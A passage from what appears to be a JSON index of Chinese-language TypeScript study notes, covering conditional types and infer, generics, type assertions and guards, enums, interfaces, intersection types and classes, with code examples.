条件类型的分配属性可以方便地用于过滤联合类型： // 求不同：从 T 中删除可分配给 U 的类型 type Diff&lt;T, U&gt; = T extends U ? never : T; // 求相同：从 T 中删除不可分配给 U 的类型 type Filter&lt;T, U&gt; = T extends U ? T : never; type T1 = Diff&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot; | &quot;d&quot;, &quot;a&quot; | &quot;c&quot; | &quot;f&quot;&gt;; // type T1 = &quot;b&quot; | &quot;d&quot; type T2 = Filter&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot; | &quot;d&quot;, &quot;a&quot; | &quot;c&quot; | &quot;f&quot;&gt;; // &quot;a&quot; | &quot;c&quot; // type T2 = &quot;a&quot; | &quot;c&quot; type T3 = Diff&lt;string | number | (() =&gt; void), Function&gt;; // string | number // type T3 = string | number type T4 = Filter&lt;string | number | (() =&gt; void), Function&gt;; // () =&gt; void // type T4 = () =&gt; void // 从 T 中删除 null 和 undefined type NotNullable&lt;T&gt; = Diff&lt;T, null | undefined&gt;; type T5 = NotNullable&lt;string | number | undefined&gt;; // type T5 = string | number type T6 = NotNullable&lt;string | string[] | null | undefined&gt;; // type T6 = string | string[] 下面是一个名为 Flatten 的类型，它将数组类型扁平化为它们的元素类型，不是数组类型时返回原类型： type Flatten&lt;T&gt; = T extends any[] ? T[number] : T; // 提取元素类型 type Str = Flatten&lt;string[]&gt;; // type Str = string type Num = Flatten&lt;number&gt;; // type Num = number 这里使用了索引访问 number 来获取 string[] 的元素类型。条件类型还为我们提供了一种使用 infer 关键字从 true 分支中与之进行比较的类型中进行推断的方法。 infer infer 关键字可以在条件类型的条件内使用，将推断的类型放入变量中，然后可以在条件分支中使用该推断变量。例如，我们可以在 Flatten 中推断元素类型，而不是使用索引访问类型“手动”提取它： type Flatten&lt;T&gt; = T extends Array&lt;infer Item&gt; ? Item : T; // type of item1 is `number` type item1 = Flatten&lt;number[]&gt;; // type of item2 is `{name: string}` type item2 = Flatten&lt;{ name: string }&gt;; 在这里，我们使用 infer 关键字以声明方式引入一个名为 Item 的新泛型类型变量，而不是指定如何在 true 分支中检索元素类型 T。下面是另一种写法： type Flatten&lt;T&gt; = T extends (infer E)[] ? E : T; // type of item1 is `number` type item1 = Flatten&lt;number[]&gt;; // type of item2 is `{name: string}` type item2 = Flatten&lt;{ name: string }&gt;; 可以使用 infer 关键字编写一些有用的辅助类型别名。例如，对于简单的情况，我们可以从函数类型中提取返回类型： type GetReturnType&lt;Type&gt; = Type extends (...args: never[]) =&gt; infer Return ? Return : never; type Num = GetReturnType&lt;() =&gt; number&gt;; // type Num = number type Str = GetReturnType&lt;(x: string) =&gt; string&gt;; // type Str = string type Bools = GetReturnType&lt;(a: boolean, b: boolean) =&gt; boolean[]&gt;; // type Bools = boolean[] 我们也可以使用内置工具类型 ReturnType 获取函数返回值类型。 type Num = ReturnType&lt;() =&gt; number&gt;; // type Num = number type Str = ReturnType&lt;(x: string) =&gt; string&gt;; // type Str = string type Bools = ReturnType&lt;(a: boolean, b: boolean) =&gt; boolean[]&gt;; // type Bools = boolean[] 借助 infer 可以实现元组转联合类型。 type Flatten&lt;T&gt; = T extends Array&lt;infer U&gt; ? U : never; type T0 = [string, number]; type T1 = Flatten&lt;T0&gt;; // string | number 可以嵌套条件类型以形成按顺序评估的模式匹配序列。 type Unpacked&lt;T&gt; = T extends (infer U)[] ? U : T extends (...args: any[]) =&gt; infer U ? U : T extends Promise&lt;infer U&gt; ? U : T; type T0 = Unpacked&lt;string&gt;; // type T0 = string type T1 = Unpacked&lt;string[]&gt;; // type T1 = string type T2 = Unpacked&lt;() =&gt; string&gt;; // type T2 = string type T3 = Unpacked&lt;Promise&lt;string&gt;&gt;; // type T3 = string type T4 = Unpacked&lt;Promise&lt;string&gt;[]&gt;; // type T4 = Promise&lt;string&gt; type T5 = Unpacked&lt;Unpacked&lt;Promise&lt;string&gt;[]&gt;&gt;; // type T5 = string ","link":"https://zkrisj.github.io/post/typescript-suo-yin-lei-xing-ying-she-lei-xing-tiao-jian-lei-xing-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 泛型、类型转换、类型守卫 ｜ 青训营笔记","content":"TypeScript 介绍 TypeScript 是 JavaScript 的超集，提供了 JavaScript 的所有功能，并提供了可选的静态类型、Mixin、类、接口和泛型等特性。 TypeScript 的目标是通过其类型系统帮助及早发现错误并提高 JavaScript 开发效率。 通过 TypeScript 编译器或 Babel 转码器转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。 任何现有的 JavaScript 程序都可以运行在 TypeScript 环境中，并只对其中的 TypeScript 代码进行编译。 在完整保留 JavaScript 运行时行为的基础上，通过引入静态类型定义来提高代码的可维护性，减少可能出现的 bug。 永远不会改变 JavaScript 代码的运行时行为，例如数字除以零等于 Infinity。这意味着，如果将代码从 JavaScript 迁移到 TypeScript ，即使 TypeScript 认为代码有类型错误，也可以保证以相同的方式运行。 对 JavaScript 类型进行了扩展，增加了例如 any、unknown、never、void。 一旦 TypeScript 的编译器完成了检查代码的工作，它就会 擦除 类型以生成最终的“已编译”代码。这意味着一旦代码被编译，生成的普通 JS 代码便没有类型信息。这也意味着 TypeScript 绝不会根据它推断的类型更改程序的 行为。最重要的是，尽管可能会在编译过程中看到类型错误，但类型系统自身与程序如何运行无关。 在较大型的项目中，可以在单独的文件 tsconfig.json 中声明 TypeScript 编译器的配置，并细化地调整其工作方式、严格程度、以及将编译后的文件存储在何处。 泛型 泛型是一种捕获参数类型的方法，用来创建能够在多种类型上工作可重用的组件，而不是单个类型，这样用户就可以以自己的数据类型来使用组件。 function identity&lt;T&gt;(arg: T): T { return arg; } 这里，使用了一个类型变量 T，它是一种特殊的变量，只用于表示类型而不是值。T 帮助捕获用户传入的类型（比如：number），之后就可以使用这个类型。再次使用了 T 当做返回值类型，这样参数类型与返回值类型就是相同的了。 可以用两种方式调用一个泛型函数： 第一种方式是将所有参数（包括类型参数）传递给函数。 let output = identity&lt;string&gt;(&quot;myString&quot;); // let output: string 这里，显式地将 T 设置为 string，使用了 &lt;&gt; 括起来，并作为函数调用的参数之一。 第二种方式是最常见的，使用类型参数推断，编译器根据传入的参数类型自动设置 T 的类型。 let output2 = identity(&quot;myString&quot;); // let output2: string 不必在尖括号（&lt;&gt;）中显式传递类型，编译器只是根据值 myString，即可将 T 设置为其类型。虽然类型参数推断是保持代码更短、更可读的有用工具，但当编译器无法推断类型时，比如在一些复杂的情况下，还是需要像第一种方式那样显式传递类型参数。 泛型变量 泛型变量代表的是任意类型。例如要在一个函数中，打印一个参数的长度。由于使用这个函数的人可能传入的是个数字，而数字是没有 length 属性的，所以会报错。 function loggingIdentity&lt;T&gt;(arg: T): T { console.log(arg.length); // error: Property 'length' does not exist on type 'T'. return arg; } 但如果操作的是 T 类型的数组，length 属性是存在的。 function loggingIdentity&lt;T&gt;(arg: T[]): T[] { console.log(arg.length); return arg; } 泛型函数 loggingIdentity 接收泛型参数 T 和类型是 T[] 的数组参数 arg，并返回类型是 T[] 的数组。 泛型类型 可以使用不同的泛型参数名，只要在数量上和使用方式上能对应上就可以。 let myIdentity: &lt;Input&gt;(arg: Input) =&gt; Input = identity; 还可以使用带有调用签名的对象字面量类型来定义泛型函数。 let myIdentity2: { &lt;T&gt;(arg: T): T } = identity; 可以把上面例子里的对象字面量拿出来做为一个泛型接口。 interface GenericIdentityFn { &lt;T&gt;(arg: T): T; } function identity&lt;T&gt;(arg: T): T { return arg; } let myIdentity: GenericIdentityFn = identity; 可以把泛型参数也当作整个接口的一个参数，就能清楚的知道使用的具体是哪个泛型类型，接口里的其它成员也能知道这个参数的类型了。 interface GenericIdentityFn&lt;T&gt; { (arg: T): T; } function identity&lt;T&gt;(arg: T): T { return arg; } let myIdentity: GenericIdentityFn&lt;number&gt; = identity; let myIdentity2: GenericIdentityFn&lt;string&gt; = identity; 现在接口上有了一个非泛型函数签名，它是泛型类型的一部分，而不是描述泛型函数。当使用 GenericIdentityFn 时，还需要指定相应的类型参数（这里：number），从而有效地锁定了之后代码里使用的类型。了解何时将类型参数直接放在调用签名上和接口本身上，将有助于描述类型的哪些方面是属于泛型的。 除了泛型接口，还可以创建泛型类。但是，无法创建泛型枚举和泛型命名空间。 泛型类 泛型类与泛型接口相似，在类名称后面的尖括号（&lt;&gt;）中有一个泛型类型参数列表。与接口一样，将类型参数放在类本身可以确保类的所有成员都使用同一类型。 class GenericNumber&lt;T&gt; { zeroValue: T; add: (x: T, y: T) =&gt; T; } let myGenericNumber = new GenericNumber&lt;number&gt;(); myGenericNumber.zeroValue = 0; myGenericNumber.add = function(x, y) { return x + y; }; let stringNumeric = new GenericNumber&lt;string&gt;(); stringNumeric.zeroValue = &quot;&quot;; stringNumeric.add = function (x, y) { return x + y; }; console.log(stringNumeric.add(stringNumeric.zeroValue, &quot;test&quot;)); 类有两部分构成：静态部分和实例部分，而泛型类指的是实例部分的类型，所以类的静态成员不能使用类的泛型类型。 泛型约束 有时候想操作某类型的一组值，并且知道这组值具有什么样的属性。 例如在 loggingIdentity 例子中，想访问 arg 的 length 属性，但是编译器并不能证明每种类型都有 length 属性，所以就报错了。 如果希望只要该类型具有此成员，就允许使用它，需要创建一个包含 length 属性的接口，然后使用 extends 关键字后跟该接口，即可实现约束： interface Lengthwise { length: number; } function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T { console.log(arg.length); return arg; } 由于泛型函数现在受到约束，它不再适用于任何类型： loggingIdentity(3); // Argument of type 'number' is not assignable to parameter of type 'Lengthwise'. 需要传入符合约束类型的值，包含所有必需的属性： loggingIdentity({length: 10, value: 3}); 在泛型约束中使用类型参数 声明一个泛型参数，且它被另一个泛型参数约束。下面的泛型参数 Key 被约束为参数 obj 对象中存在的属性： function getProperty&lt;T, Key extends keyof T&gt;(obj: T, key: Key) { return obj[key]; } let x = { a: 1, b: 2, c: 3, d: 4 }; getProperty(x, &quot;a&quot;); getProperty(x, &quot;m&quot;); // Argument of type '&quot;m&quot;' is not assignable to parameter of type '&quot;a&quot; | &quot;b&quot; | &quot;c&quot; | &quot;d&quot;'. 在泛型里使用类类型 使用泛型创建工厂函数时，需要通过其构造函数引用类类型。 function create&lt;T&gt;(c: { new (): T }): T { return new c(); } 更高级的用法是使用原型属性来推断并约束构造函数与类实例的关系，例如 Mixins 即使用了此模式。 class BeeKeeper { hasMask: boolean = true; } class ZooKeeper { nametag: string = &quot;Mikle&quot;; } class Animal { numLegs: number = 4; } class Bee extends Animal { keeper: BeeKeeper = new BeeKeeper(); } class Lion extends Animal { keeper: ZooKeeper = new ZooKeeper(); } function createInstance&lt;A extends Animal&gt;(c: new () =&gt; A): A { return new c(); } createInstance(Lion).keeper.nametag; createInstance(Bee).keeper.hasMask; 类型转换（断言） 在处理类型时，有时需要重写变量的类型，例如库提供了不正确的类型。强制转换就是重写类型的过程。 as 转换变量的一种简单方法是使用 as 关键字，这将直接更改给定变量的类型。 let x: unknown = 'hello'; console.log((x as string).length); 强制转换不会改变变量内数据的类型： let x: unknown = 4; console.log((x as string).length); // undefined 但仍然会对类型转换进行类型检查： console.log((4 as string).length); // Error: Conversion of type 'number' to type 'string' may be a mistake because neither type sufficiently overlaps with the other. If this was intentional, convert the expression to 'unknown' first. &lt;&gt; 使用 &lt;&gt; 的工作原理与使用 as 转换相同。 let x: unknown = 'hello'; console.log((&lt;string&gt;x).length); 这种类型转换不能用于 TSX 文件中。 强制转换 若要覆盖 TypeScript 在强制转换时可能引发的类型错误，先强制转换为 unknown 类型，然后再转换为目标类型。 let x = 1; console.log(((x as unknown) as string).length); // undefined console.log((&lt;string&gt;&lt;unknown&gt;x2).length); // undefined 类型守卫 类型守卫就是一些在运行时检查某个作用域里的类型的表达式。 interface IBird { fly(); layEggs(); } interface IFish { swim(); layEggs(); } class Bird implements IBird { fly(){} layEggs(){} } class Fish implements IFish { swim(){} layEggs(){} } function getSmallPet(): IFish | IBird { return Math.random() &gt; 0.5 ? new Fish() : new Bird(); } let pet = getSmallPet(); // 如果一个值是联合类型，只能访问此联合类型的所有类型里共有的成员 pet.layEggs(); // okay pet.swim(); // errors JavaScript 里用来判断类型的方法是检查成员是否存在。 // 每一个成员访问都会报错 if (pet.swim) { pet.swim(); } else if (pet.fly) { pet.fly(); } 在 TypeScript 中需要使用类型断言： if ((&lt;Fish&gt;pet).swim) { (&lt;Fish&gt;pet).swim(); } else { (&lt;Bird&gt;pet).fly(); } 这里我们不得不多次使用类型断言。 自定义的类型守卫 自定义一个类型守卫，只要简单地定义一个函数，返回值是一个类型谓词，类型谓词形式为 parameterName is T， parameterName 必须是来自于当前函数的一个参数类型名。 // 当调用 `isFish` 时会将参数缩小为具体的类型 function isFish(pet: Fish | Bird): pet is Fish { return (&lt;Fish&gt;pet).swim !== undefined; } // 'swim' 和 'fly' 调用都没有问题了 if (isFish(pet)) { pet.swim(); } else { pet.fly(); } typeof 类型守卫 下面定义了每个函数来判断相应类型： function isNumber(x: any): x is number { return typeof x === &quot;number&quot;; } function isString(x: any): x is string { return typeof x === &quot;string&quot;; } function padLeft(value: string, padding: string | number) { if (isNumber(padding)) { return Array(padding + 1).join(&quot; &quot;) + value; } if (isString(padding)) { return padding + value; } throw new Error(`Expected string or number, got '${padding}'.`); } TypeScript 会自动将 typeof x === &quot;number&quot; 识别为一个类型守卫，所以不必抽象成一个函数，也就是说可以直接在内联代码块里检查类型： function padLeft(value: string, padding: string | number) { if (typeof padding === &quot;number&quot;) { return Array(padding + 1).join(&quot; &quot;) + value; } if (typeof padding === &quot;string&quot;) { return padding + value; } throw new Error(`Expected string or number, got '${padding}'.`); } typeof 类型守卫只有两种形式能被识别：typeof v === &quot;typename&quot; 和 typeof v !== &quot;typename&quot;， typename 必须是 number， string， boolean 或 symbol。但是，TypeScript 不会阻止你与其它字符串比较，只是不会把那些表达式识别为类型守卫。 instanceof 类型守卫 instanceof 类型守卫通过构造函数来缩小类型，后面要求是一个构造函数类型，TypeScript 将按照顺序缩小为： 如果类型不为 any，函数的 prototype 类型。 构造函数返回的联合类型。 interface Padder { getPaddingString(): string } class SpaceRepeatingPadder implements Padder { constructor(private numSpaces: number) { } getPaddingString() { return Array(this.numSpaces + 1).join(&quot; &quot;); } } class StringPadder implements Padder { constructor(private value: string) { } getPaddingString() { return this.value; } } function getRandomPadder() { return Math.random() &gt; 0.5 ? new SpaceRepeatingPadder(4) : new StringPadder(&quot; &quot;); } // 类型为SpaceRepeatingPadder | StringPadder let padder: Padder = getRandomPadder(); if (padder instanceof SpaceRepeatingPadder) { padder; // 类型缩小为'SpaceRepeatingPadder' } if (padder instanceof StringPadder) { padder; // 类型缩小为'StringPadder' } 空值类型守卫 使用类型守卫来去除联合类型中的 null 与 JavaScript 写法一致。 function f(sn: string | null): string { if (sn == null) { return &quot;default&quot;; } else { return sn; } } 也可以使用短路运算符： function f2(sn: string | null): string { return sn ?? &quot;default&quot;; } 在编译器无法消除 null 或 undefined 的情况下，可以使用非空断言运算符手动删除它们，语法是后缀添加 !，将从变量类型中删除 null 和 undefined 类型。 interface UserAccount { id: number; email?: string; } function getUser(id: string): UserAccount | undefined { return { email: '' } as any; } const user = getUser(&quot;admin&quot;); user.id; // Object is possibly 'undefined'. if (user) { user.email.length; // Object is possibly 'undefined'. } // 如果确定这些对象或字段存在，则添加短路可空性 user!.email!.length; ","link":"https://zkrisj.github.io/post/typescript-fan-xing-lei-xing-zhuan-huan-lei-xing-shou-wei-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 高级数据类型 ｜ 青训营笔记","content":"TypeScript 介绍 TypeScript 是 JavaScript 的超集，提供了 JavaScript 的所有功能，并提供了可选的静态类型、Mixin、类、接口和泛型等特性。 TypeScript 的目标是通过其类型系统帮助及早发现错误并提高 JavaScript 开发效率。 通过 TypeScript 编译器或 Babel 转码器转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。 任何现有的 JavaScript 程序都可以运行在 TypeScript 环境中，并只对其中的 TypeScript 代码进行编译。 在完整保留 JavaScript 运行时行为的基础上，通过引入静态类型定义来提高代码的可维护性，减少可能出现的 bug。 永远不会改变 JavaScript 代码的运行时行为，例如数字除以零等于 Infinity。这意味着，如果将代码从 JavaScript 迁移到 TypeScript ，即使 TypeScript 认为代码有类型错误，也可以保证以相同的方式运行。 对 JavaScript 类型进行了扩展，增加了例如 any、unknown、never、void。 一旦 TypeScript 的编译器完成了检查代码的工作，它就会 擦除 类型以生成最终的“已编译”代码。这意味着一旦代码被编译，生成的普通 JS 代码便没有类型信息。这也意味着 TypeScript 绝不会根据它推断的类型更改程序的 行为。最重要的是，尽管您可能会在编译过程中看到类型错误，但类型系统自身与程序如何运行无关。 在较大型的项目中，可以在单独的文件 tsconfig.json 中声明 TypeScript 编译器的配置，并细化地调整其工作方式、严格程度、以及将编译后的文件存储在何处。 函数 TypeScript 具有定义函数参数和返回值的特定语法。 函数返回值的类型可以明确定义。 function getTime(): number { return new Date().getTime(); } let time = getTime(); // let time: number console.log(time); 如果没有定义返回类型，TypeScript 将尝试通过返回的变量或表达式的类型来推断它。 类型 void 可用于指示函数不返回任何值。 function printHello(): void { console.log('Hello!'); } 函数参数的类型与变量声明的语法相似。 function multiply(a: number, b: number) { return a * b; } 如果没有定义参数类型，TypeScript 将默认使用 any，除非额外的类型信息可用，如默认参数和类型别名。 默认情况下，TypeScript 会假定所有参数都是必需的，但它们可以显式标记为可选。 // 这里的 `?` 运算符将参数 `c` 标记为可选 function add(a: number, b: number, c?: number) { return a + b + (c || 0); } console.log(add(2,5)); 对于具有默认值的参数，默认值位于类型注释之后。 function pow(value: number, exponent: number = 10) { return value ** exponent; } TypeScript 还可以从默认值推断类型。 function pow(value, exponent = 10) { return value ** exponent; } console.log(pow(10, '2')); // Argument of type 'string' is not assignable to parameter of type 'number'. 命名参数遵循与普通参数相同的模式。 function divide({ dividend, divisor }: { dividend: number, divisor: number }) { return dividend / divisor; } console.log(divide({dividend: 10, divisor: 2})); 剩余参数可以像普通参数一样类型化，但类型必须是数组，因为剩余参数始终是数组。 function add(a: number, b: number, ...rest: number[]) { return a + b + rest.reduce((p, c) =&gt; p + c, 0); } console.log(add(10,10,10,10,10)); 函数类型可以与具有类型别名的函数分开指定。 type Negate = (value: number) =&gt; number; // 参数 value 自动从 Negate 类型被分配 number 类型 const negateFunction: Negate = (value) =&gt; value * -1; console.log(negateFunction(10)); 函数重载是方法名字相同，而参数不同，返回类型可以相同也可以不同。 函数重载类型化定义了一个函数可以被调用的所有方式，在自动补全时会很有用，可以在自动补全中列出所有可能的重载记录。 函数重载需要定义重载签名（一个以上，定义函数的形参和返回类型，没有函数体，不可调用）和一个实现签名。 除了常规的函数之外，类中的方法也可以重载。 function makeDate(timestamp: number): Date; function makeDate(m: number, d: number, y: number): Date; function makeDate(mOrTimestamp: number, d?: number, y?: number): Date { if (d !== undefined &amp;&amp; y !== undefined) { return new Date(y, mOrTimestamp, d); } else { return new Date(mOrTimestamp); } } const d1 = makeDate(12345678); const d2 = makeDate(5, 5, 5); const d3 = makeDate(1, 3); // No overload expects 2 arguments, but overloads do exist that expect either 1 or 3 arguments. 在本例中，我们编写了两个重载：一个接受一个参数，另一个接受三个参数。前两个签名称为重载签名，但它们都不能用两个参数调用。 在下面这个示例中，我们可以用字符串或数组调用它。但是，我们不能使用可能是字符串或数组的值调用它，报错：No overload matches this call.，因为 TypeScript 只能将函数调用解析为单个重载： function len(s: string): number; function len(arr: any[]): number; function len(x: any[] | string) { return x.length; } len(&quot;&quot;); // OK len([0]); // OK len(Math.random() &gt; 0.5 ? &quot;hello&quot; : [0]); // No overload matches this call. 因为两个重载都有相同的参数计数和相同的返回类型，所以我们可以编写一个非重载版本的函数： function len(x: any[] | string) { return x.length; } 现在我们可以使用任意一种值调用它，所以如果可能，可以首选具有联合类型的参数，而不是重载函数。 枚举 枚举是一个特殊的“类”，表示一组常量（不可更改的变量）。使用枚举类型可以为一组数值赋予更加友好的名字。枚举有两种数据类型：string 和 numer。 默认情况下，枚举会将第一个值初始化为 0，后面的值依次值加 1。 enum CardinalDirections { North, East, South, West }; let currentDirection: CardinalDirections = CardinalDirections.North; console.log(currentDirection); // '0' 因为 North 是第一个值 // currentDirection = 'North'; // Error: &quot;North&quot; is not assignable to type 'CardinalDirections'. 可以设置第一个枚举的值的数字，并让它自动递增。 enum CardinalDirections { North = 1, East, South, West } console.log(CardinalDirections.North); // logs 1 console.log(CardinalDirections.West); // logs 4 可以为每个枚举值分配唯一的数值，值将不会自动递增。 enum StatusCodes { NotFound = 404, Success = 200, Accepted = 202, BadRequest = 400 }; console.log(StatusCodes.NotFound); // logs 404 console.log(StatusCodes.Success); // logs 200 string 类型比 numer 类型枚举更常见，因为它们的可读性和目的性更强。 enum CardinalDirections { North = 'North', East = &quot;East&quot;, South = &quot;South&quot;, West = &quot;West&quot; }; console.log(CardinalDirections.North); // logs &quot;North&quot; console.log(CardinalDirections.West); // logs &quot;West&quot; 可以混合字符串和数字枚举值，但不建议这样做。 可以通过枚举值来获取枚举名称。 enum StatusCodes { NotFound = 404, Success = 200, Accepted = 202, BadRequest = 400 }; let s1 = StatusCodes[200]; // string | undefined console.log(s1); // Success 如果某个属性的值是计算出来的，它后面的第一位成员必须初始化。 const value = 0; enum List { A = value, B = 2, // 必须初始化 C, } 为了避免在额外生成的代码上的开销和额外的非直接的对枚举成员的访问，我们可以使用 const 枚举，常量枚举不允许包含计算成员。不同于常规的枚举，它们在编译阶段会被删除。 const a = 1; const enum Enum { A = 1, B = A * 2, C = a * 2, // const enum member initializers can only contain literal values and other computed enum values. } 使用 keyof typeof 来获取将所有 Enum 键表示为字符串的 Type。 enum LogLevel { ERROR, WARN, INFO, DEBUG, } // 相当于 type LogLevelStrings = 'ERROR' | 'WARN' | 'INFO' | 'DEBUG'; type LogLevelStrings = keyof typeof LogLevel; 联合类型 联合类型（Union Types）可以通过 | 运算符将变量设置多种类型，赋值时可以根据设置的类型来赋值。当一个值可以是多个单一类型时，可以使用联合类型。例如当变量是 string 或 number 时。 function printStatusCode(code: string | number) { console.log(`My status code is ${code}.`) } printStatusCode(404); printStatusCode('404'); 注意：使用联合类型时，需要知道你的类型是什么，以避免类型错误： function printStatusCode(code: string | number) { console.log(`My status code is ${code.toUpperCase()}.`); // error: Property 'toUpperCase' does not exist on type 'string | number'. Property 'toUpperCase' does not exist on type 'number' } 在上述示例中，因为 toUpperCase() 是一个字符串方法，而数字无法访问它。 类型别名和接口 TypeScript 允许类型与使用它们的变量分开定义。类型别名和接口允许在不同的变量之间轻松共享类型。 类型别名 类型别名就像我们使用了匿名对象类型一样。 type Point = { x: number; y: number; }; function printCoord(pt: Point) { console.log(&quot;The coordinate's x value is &quot; + pt.x); console.log(&quot;The coordinate's y value is &quot; + pt.y); } printCoord({ x: 100, y: 100 }); 可以使用类型别名为任何类型命名，而不仅仅是对象类型。例如，类型别名可以命名联合类型： type ID = number | string; 类型别名可以定义指定区间具体的数值，该类型只能取定义的区间内的数值。 type Direction = 'center' | 'left' | 'right'; let d: Direction = ''; // Type '&quot;&quot;' is not assignable to type 'Direction'. 类型别名可以指定模板字符串类型规则。 type BooleanString = `${boolean}`; const bool: BooleanString = '1'; // Type '&quot;1&quot;' is not assignable to type '&quot;false&quot; | &quot;true&quot;'. type SerialNumber= `${number}.${number}`; const id: SerialNumber= '1.2'; 接口 接口类似于类型别名，但是只适用于对象类型。 就像上面使用类型别名一样，TypeScript 只关心我们传递给 printCoord 的值的结构——它是否具有预期的属性。只关心类型的结构和功能，这就是我们将 TypeScript 称为结构类型系统的原因。 interface Point { x: number; y: number; } function printCoord(pt: Point) { console.log(&quot;The coordinate's x value is &quot; + pt.x); console.log(&quot;The coordinate's y value is &quot; + pt.y); } printCoord({ x: 100, y: 100 }); 接口的几乎所有功能都可以在类型别名中使用，关键区别在于类型别名不能重新定义以添加新属性，而接口始终是可扩展的。 type Window = { title: string } // Error: Duplicate identifier 'Window'. type Window = { ts: TypeScriptAPI } interface Window { title: string } interface Window { ts: TypeScriptAPI } 接口通过 extends 关键字可以继承另一个接口、类、类型别名来扩展成员，支持多继承，在 extends 关键字之后用逗号分隔。 interface Show { isShow: boolean; } type Graphic = { name: string; } class Point { x: number; y: number; } interface Point3d extends Point, Graphic, Show { z: number; } const point3d: Point3d = { x: 1, y: 2, z: 3, name: '1', isShow: true }; 与使用接口描述函数类型差不多，我们也可以描述那些能够“通过索引得到”的类型。可索引类型具有一个 索引签名，它描述了对象索引的类型，还有相应的索引返回值类型。 interface i1 { [index: number]: string } let list: i1 = [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;]; // list2 = [&quot;0&quot;, 1, &quot;2&quot;] // Type 'number' is not assignable to type 'string'. interface i2 { [index: string]: number } const list2: i2 = {}; list2[&quot;0&quot;] = 0; list2[1] = &quot;1&quot;; // Type 'string' is not assignable to type 'number'. TypeScript 支持两种索引签名：字符串和数字。可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。这是因为当使用 number 来索引时，JavaScript 会将它转换成 string 然后再去索引对象。也就是说用 100（一个 number）去索引等同于使用 &quot;100&quot;（一个 string）去索引，因此两者需要保持一致。字符串索引签名能够很好的描述 dictionary 模式，并且它们也会确保所有属性与其返回值类型相匹配。 class Animal { name: string; } class Dog extends Animal { breed: string; } // 错误：使用数值型的字符串索引，有时会得到完全不同的Animal! interface NotOkay { [x: number]: Animal; // 'number' index type 'Animal' is not assignable to 'string' index type 'Dog'. [x: string]: Dog; } interface NumberDictionary { [index: string]: number; length: number; // 可以，length是number类型 name: string // 错误，name的类型与索引类型返回值的类型不匹配 } 除了描述带有属性的普通对象外，接口也可以描述函数类型。 使用接口表示函数类型，需要给接口定义一个调用签名，它就像是一个只有参数列表和返回值类型的函数定义。 参数列表里的每个参数都需要名字和类型，对于函数类型的类型检查来说，函数的参数名不需要与接口里定义的名字相匹配。 函数的参数会逐个进行检查，要求对应位置上的参数类型是兼容的。 如果不指定类型，类型系统会推断出参数类型。 interface SearchFunc { (source: string, subString: string): boolean; } let mySearch: SearchFunc; mySearch = function(source: string, subString: string) { let result = source.search(subString); return result &gt; -1; } mySearch = function(src: string, sub: string): boolean { let result = src.search(sub); return result &gt; -1; } mySearch = function(src, sub) { let result = src.search(sub); return result &gt; -1; } 交叉类型 接口允许我们通过扩展其他类型来构建新类型。TypeScript 还提供了另一种称为交叉类型的结构，使用 &amp; 运算符定义，主要用于组合现有的对象类型。 交叉类型包含了所需的所有类型的特性。 interface Colorful { color: string; } interface Circle { radius: number; } function draw(circle: Colorful &amp; Circle) { console.log(`Color was ${circle.color}`); console.log(`Radius was ${circle.radius}`); } draw({ color: &quot;blue&quot;, radius: 42 }); // 'raidus' does not exist in type 'Colorful &amp; Circle'. Did you mean to write 'radius'? draw({ color: &quot;red&quot;, raidus: 42 }); 在这里，我们将 Colorful 和 Circle 相交以生成一个包含 Colorful 和 Circle 的所有成员的新类型。 可以将多个接口类型合并成一个类型，实现等同于接口继承的效果。 interface A { name: string; age: number; } interface B { name: string; height: string; } type Person = A &amp; B; // 相当于求并集 const person: Person = { name: 'Tom', age: 18, height: '60kg' }; 类型别名也可以与接口交叉。 interface Animal { name: string } type Person = Animal &amp; { age: number; } 类型别名可以通过交叉类型实现接口的继承行为。 type Animal = { name: string } type Bear = Animal &amp; { honey: boolean } 原始类型之间交叉类型为 never，因为任何类型都不能满足同时属于多种原始类型。 type Useless = string &amp; number; // type Useless: never Useless = 1; // 'Useless' only refers to a type, but is being used as a value here. 类 TypeScript 向 JavaScript 类添加了类型和可见性修饰符。 类的成员（属性和方法）使用类型注释（类似于变量）进行类型化。 class Person { name: string; } const person = new Person(); person.name = &quot;Jane&quot;; 类成员也可以被赋予影响可见性的特殊修饰符。TypeScript 中有三个主要的可见性修饰符： public -（默认）允许从任何地方访问类成员 private - 只允许从类内部访问类成员 protected - 允许从自身和继承它的任何类访问类成员 class Person { private name: string; constructor(name: string) { this.name = name; } getName(): string { return this.name; } } const person = new Person(&quot;Jane&quot;); console.log(person.getName()); // person.name isn't accessible from outside the class since it's private TypeScript 通过向参数添加可见性修饰符，可以在构造函数中定义类成员。 class Person { constructor(private name: string) {} getName(): string { return this.name; } } const person = new Person(&quot;Jane&quot;); console.log(person.getName()); // Jane 与数组类似，readonly 关键字可以防止类成员被更改，只读属性必须在声明时或构造函数里被初始化，readonly 关键字也可以在构造函数中定义类成员。 class Person { readonly name: string = 'Jane'; constructor(name?: string) { if(name) this.name = name; } } const person = new Person(&quot;a&quot;); // person.name = ''; // Cannot assign to 'name' because it is a read-only property. 类通过 extends 关键字继承另一个类，一个类只能继承一个类；通过 implements 关键字实现接口（接口描述了类的公共部分，而不是公共和私有两部分），一个类支持实现多个接口，在 implements 关键字之后用逗号分隔。 interface Shape { getArea: () =&gt; number; } class Rectangle implements Shape { constructor(protected readonly width: number, protected readonly height: number) {} getArea(): number { return this.width * this.height; } } class Square extends Rectangle { constructor(width: number) { super(width, width); } } 当一个类扩展另一个类时，它可以用相同的名称重写父类的成员。较新版本的 TypeScript 允许使用 override 关键字显式标记，它可以帮助防止意外重写不存在的方法。使用设置 noImplicitOverride 可以强制在重写时使用它。 class Rectangle { constructor(protected readonly width: number, protected readonly height: number) {} toString(): string { return `Rectangle[width=${this.width}, height=${this.height}]`; } } class Square extends Rectangle { constructor(width: number) { super(width, width); } override toString(): string { return `Square[width=${this.width}]`; } } 抽象类允许它们用作其他类的基类，而无需实现其所有成员。通过使用 abstract 关键字定义抽象类，未实现的成员也需要使用 abstract 关键字标识。抽象类不能直接实例化，因为它们没有实现其所有成员。 abstract class Polygon { abstract getArea(): number; toString(): string { return `Polygon[area=${this.getArea()}]`; } } class Rectangle extends Polygon { constructor(protected readonly 